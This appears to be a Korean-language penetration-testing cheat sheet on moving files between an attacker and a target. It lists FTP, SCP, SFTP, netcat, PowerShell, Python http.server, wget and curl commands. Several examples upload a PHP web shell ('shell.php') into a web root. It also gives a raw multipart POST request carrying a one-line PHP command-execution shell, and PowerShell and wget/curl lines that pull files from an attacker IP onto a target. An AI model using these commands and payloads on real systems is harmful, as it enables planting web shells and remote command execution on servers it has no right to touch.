## 파일 업로드 명령어 예시

### 로컬에서 원격으로 파일 전송하기

**FTP 업로드**

```bash
ftp> put 파일명                      # 현재 디렉토리 파일 업로드
ftp> put /경로/파일명                # 특정 경로의 파일 업로드
```

**SCP 업로드**

```bash
scp 파일명 사용자@원격IP:/목적지/경로   # 기본 형식
scp shell.php admin@10.10.10.10:/var/www/html/  # 실제 예시
scp -P 2222 shell.php user@10.10.10.10:/tmp/    # 포트 지정
```

**SFTP 업로드**

```bash
sftp 사용자@원격IP
sftp> put 파일명 목적지경로          # 특정 경로에 업로드
sftp> put shell.php /var/www/html/   # 실제 예시
```

**NC 사용**

```bash
# 수신측(타겟)
nc -lvp 1234 > 받을파일명

# 전송측(공격자)
nc 타겟IP 1234 < 보낼파일명
```

**웹쉘/파일 업로더 사용 시**

```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadfile"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**PowerShell 다운로드(윈도우 타겟)**

```powershell
# 원격에서 파일 가져오기
(New-Object System.Net.WebClient).DownloadFile("http://공격자IP/파일명", "C:\저장경로\파일명")
```

**Python 업로드 서버**

```bash
# 공격자 측에서 업로드용 서버 실행
python3 -m http.server 8000

# 타겟에서 파일 다운로드
wget http://공격자IP:8000/파일명
curl -O http://공격자IP:8000/파일명
```

**curl 사용**

```bash
curl -F "file=@/경로/파일명" http://타겟IP/upload.php
```

`@`는 curl에서 파일 업로드할 때 로컬 파일임을 나타내는 표시입니다. `-F` 옵션과 함께 사용합니다.
